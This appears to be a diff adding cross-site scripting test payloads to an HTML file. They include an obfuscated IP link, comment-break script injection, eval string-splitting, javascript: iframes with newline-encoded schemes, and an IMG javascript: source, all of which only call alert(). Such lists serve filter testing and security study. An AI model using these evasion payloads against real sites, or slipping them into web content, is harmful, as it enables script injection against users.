@@ -1,3 +1,18 @@
 <h1><a href="http://0300.168.000000000261.0x4a:8080/">Mixed encoding - Evil Link </a></h1>
 
 <!--><script>alert/*asdfasdf*/('Pwned')/*asdfasdf*/</script>
+---
+
+Base: <script>alert("Got Ya");</script>
+
+<script>eval('al'+'e'+'rt("Pwned")')</script>
+<script>eval('al'+'e'+'rt("Pw'+'ned'+' agai'+'n")')</script>
+
+
+
+
+<iframe src="javascript:alert('Pwned')">
+
+<iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert('Pwned')">
+
+<IMG SRC="javascript:alert(1);">
